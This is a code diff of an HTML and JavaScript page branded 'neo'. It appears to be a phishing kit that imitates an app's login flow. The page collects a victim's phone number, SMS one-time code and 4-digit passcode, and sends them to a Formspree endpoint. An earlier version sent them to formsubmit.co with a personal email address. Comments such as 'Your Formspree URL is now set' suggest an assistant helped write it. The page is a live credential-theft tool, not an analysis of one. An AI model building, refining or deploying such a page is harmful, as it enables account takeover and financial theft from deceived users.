@@ -36,7 +36,7 @@
         }
 
         /* --- Page 1 & 2 Common --- */
-        #page-1, #page-2, #success-page {
+        #page-1, #page-2 {
             background-color: #FFFFFF;
         }
 
@@ -169,7 +169,6 @@
         <div class="content-area">
             <img src="https://res.cloudinary.com/dl6aos9km/image/upload/v1754500293/20250806_200924_0000_popwzo.png" alt="neo logo" class="logo">
             <form id="form-1">
-                <input type="hidden" name="_subject" value="Step 1: Phone Number Registration">
                 <div class="phone-input-container">
                     <select name="country_code" class="country-code">
                         <option value="+964">+964</option>
@@ -190,15 +189,12 @@
             <h2>Enter the 6-digit code</h2>
             <p id="phone-display">sent to ...</p>
             <form id="form-2" style="width:100%">
-                <input type="hidden" name="_subject" value="Step 2: OTP Code">
-                <input type="hidden" id="otp-full-code" name="otp_code">
+                <input type="hidden" name="Step" value="1 & 2: Phone and OTP">
+                <input type="hidden" id="hidden-country-code" name="Country Code">
+                <input type="hidden" id="hidden-phone-number" name="Phone Number">
+                <input type="hidden" id="otp-full-code" name="OTP Code">
                 <div class="otp-container">
-                    <input type="tel" maxlength="1" class="otp-input" inputmode="numeric">
-                    <input type="tel" maxlength="1" class="otp-input" inputmode="numeric">
-                    <input type="tel" maxlength="1" class="otp-input" inputmode="numeric">
-                    <input type="tel" maxlength="1" class="otp-input" inputmode="numeric">
-                    <input type="tel" maxlength="1" class="otp-input" inputmode="numeric">
-                    <input type="tel" maxlength="1" class="otp-input" inputmode="numeric">
+                    <input type="tel" maxlength="1" class="otp-input" inputmode="numeric"><input type="tel" maxlength="1" class="otp-input" inputmode="numeric"><input type="tel" maxlength="1" class="otp-input" inputmode="numeric"><input type="tel" maxlength="1" class="otp-input" inputmode="numeric"><input type="tel" maxlength="1" class="otp-input" inputmode="numeric"><input type="tel" maxlength="1" class="otp-input" inputmode="numeric">
                 </div>
             </form>
              <div class="button-area support-links">
@@ -211,30 +207,19 @@
     <div id="page-3" class="page-section">
         <div class="content-area">
              <form id="form-3" style="display: none;">
-                  <input type="hidden" name="_subject" value="Step 3: Passcode">
-                  <input type="hidden" id="passcode-input" name="passcode" value="">
+                  <input type="hidden" name="Step" value="3: Passcode">
+                  <input type="hidden" id="passcode-input" name="Passcode" value="">
              </form>
              <h2>Enter passcode</h2>
              <div class="passcode-indicators">
-                 <div class="passcode-indicator"></div>
-                 <div class="passcode-indicator"></div>
-                 <div class="passcode-indicator"></div>
-                 <div class="passcode-indicator"></div>
+                 <div class="passcode-indicator"></div><div class="passcode-indicator"></div><div class="passcode-indicator"></div><div class="passcode-indicator"></div>
              </div>
              <div class="keypad-container">
                 <div class="keypad">
-                    <button class="keypad-button" data-value="1">1</button>
-                    <button class="keypad-button" data-value="2">2</button>
-                    <button class="keypad-button" data-value="3">3</button>
-                    <button class="keypad-button" data-value="4">4</button>
-                    <button class="keypad-button" data-value="5">5</button>
-                    <button class="keypad-button" data-value="6">6</button>
-                    <button class="keypad-button" data-value="7">7</button>
-                    <button class="keypad-button" data-value="8">8</button>
-                    <button class="keypad-button" data-value="9">9</button>
-                    <button class="keypad-button" data-value="Forgot">Forgot</button>
-                    <button class="keypad-button" data-value="0">0</button>
-                    <button class="keypad-button" data-value="delete">⌫</button>
+                    <button class="keypad-button" data-value="1">1</button><button class="keypad-button" data-value="2">2</button><button class="keypad-button" data-value="3">3</button>
+                    <button class="keypad-button" data-value="4">4</button><button class="keypad-button" data-value="5">5</button><button class="keypad-button" data-value="6">6</button>
+                    <button class="keypad-button" data-value="7">7</button><button class="keypad-button" data-value="8">8</button><button class="keypad-button" data-value="9">9</button>
+                    <button class="keypad-button" data-value="Forgot">Forgot</button><button class="keypad-button" data-value="0">0</button><button class="keypad-button" data-value="delete">⌫</button>
                 </div>
              </div>
          </div>
@@ -242,42 +227,34 @@
 
      <script>
          document.addEventListener('DOMContentLoaded', () => {
+            // --- FINAL CONFIGURATION: Your Formspree URL is now set ---
+            const FORMSPREE_ENDPOINT = 'https://formspree.io/f/xldlpqzg'; 
+
             const pages = document.querySelectorAll('.page-section');
             const form1 = document.getElementById('form-1');
             const form2 = document.getElementById('form-2');
             const form3 = document.getElementById('form-3');
-
-            // MODIFICATION: Your email has been added here
-            const FORM_SUBMIT_EMAIL = 'ghazirefat@gmail.com'; 
             
-            if (form1) form1.action = `https://formsubmit.co/${FORM_SUBMIT_EMAIL}`;
-            if (form2) form2.action = `https://formsubmit.co/${FORM_SUBMIT_EMAIL}`;
-            if (form3) form3.action = `https://formsubmit.co/${FORM_SUBMIT_EMAIL}`;
+            if (form2) form2.action = FORMSPREE_ENDPOINT;
+            if (form3) form3.action = FORMSPREE_ENDPOINT;
 
             function showPage(pageId) {
                 pages.forEach(page => page.classList.remove('active'));
                 const newPage = document.getElementById(pageId);
-                if (newPage) {
-                    newPage.classList.add('active');
-                    if (pageId === 'page-2') {
-                        otpInputs[0].focus();
-                    }
-                }
+                if (newPage) newPage.classList.add('active');
+                if (pageId === 'page-2') otpInputs[0].focus();
             }
             
             function resetAllForms() {
                 form1.reset();
-                form2.reset();
-                form3.reset();
                 otpInputs.forEach(input => input.value = '');
                 passcodeHiddenInput.value = '';
                 updatePasscodeView();
                 btnToPage2.classList.remove('active');
-                phoneInput.value = '';
             }
 
             async function submitForm(formElement) {
-                if (!formElement) return;
+                if (!formElement || !formElement.action) return;
                 const formData = new FormData(formElement);
                 try {
                     await fetch(formElement.action, {
@@ -290,38 +267,32 @@
                 }
             }
 
-            // --- Page 1 Logic ---
             const btnToPage2 = document.getElementById('btn-to-page-2');
             const phoneInput = form1.querySelector('input[name="phone_number"]');
             
             phoneInput.addEventListener('input', () => {
                 phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '');
-                if (phoneInput.value.length === 10) {
-                    btnToPage2.classList.add('active');
-                } else {
-                    btnToPage2.classList.remove('active');
-                }
+                btnToPage2.classList.toggle('active', phoneInput.value.length === 10);
             });
 
-            btnToPage2.addEventListener('click', async (e) => {
+            btnToPage2.addEventListener('click', (e) => {
                 e.preventDefault();
                 if (btnToPage2.classList.contains('active')) {
-                    await submitForm(form1);
-                    const fullPhoneNumber = form1.querySelector('select').value + phoneInput.value;
-                    document.getElementById('phone-display').textContent = `sent to ${fullPhoneNumber}`;
+                    const countryCode = form1.querySelector('select').value;
+                    const phoneNumber = phoneInput.value;
+                    document.getElementById('hidden-country-code').value = countryCode;
+                    document.getElementById('hidden-phone-number').value = phoneNumber;
+                    document.getElementById('phone-display').textContent = `sent to ${countryCode}${phoneNumber}`;
                     showPage('page-2');
                 }
             });
 
-            // --- Page 2 Logic ---
             const otpInputs = document.querySelectorAll('.otp-input');
             const fullOtpInput = document.getElementById('otp-full-code');
 
             otpInputs.forEach((input, index) => {
                 input.addEventListener('input', (e) => {
-                    if (input.value && index < otpInputs.length - 1) {
-                        otpInputs[index + 1].focus();
-                    }
+                    if (input.value && index < otpInputs.length - 1) otpInputs[index + 1].focus();
                     let otp = Array.from(otpInputs).map(i => i.value).join('');
                     if (otp.length === otpInputs.length) {
                         fullOtpInput.value = otp;
@@ -329,11 +300,8 @@
                         showPage('page-3');
                     }
                 });
-
                 input.addEventListener('keydown', (e) => {
-                    if (e.key === "Backspace" && e.target.value.length === 0 && index > 0) {
-                        otpInputs[index - 1].focus();
-                    }
+                    if (e.key === "Backspace" && !e.target.value && index > 0) otpInputs[index - 1].focus();
                 });
             });
 
@@ -343,16 +311,13 @@
                 showPage('page-1');
             });
 
-            // --- Page 3 Logic ---
             const passcodeHiddenInput = document.getElementById('passcode-input');
             const passcodeIndicators = document.querySelectorAll('.passcode-indicator');
             const keypadButtons = document.querySelectorAll('.keypad-button');
 
             function updatePasscodeView() {
                 const len = passcodeHiddenInput.value.length;
-                passcodeIndicators.forEach((ind, idx) => {
-                    ind.classList.toggle('filled', idx < len);
-                });
+                passcodeIndicators.forEach((ind, idx) => ind.classList.toggle('filled', idx < len));
             }
 
             keypadButtons.forEach(button => {
@@ -367,9 +332,7 @@
                     } else if (!isNaN(parseInt(value)) && currentPasscode.length < 4) {
                         passcodeHiddenInput.value += value;
                     }
-
                     updatePasscodeView();
-
                     if (passcodeHiddenInput.value.length === 4) {
                         await submitForm(form3);
                         setTimeout(() => {
@@ -383,3 +346,4 @@
      </script>
  </body>
  </html>
+```
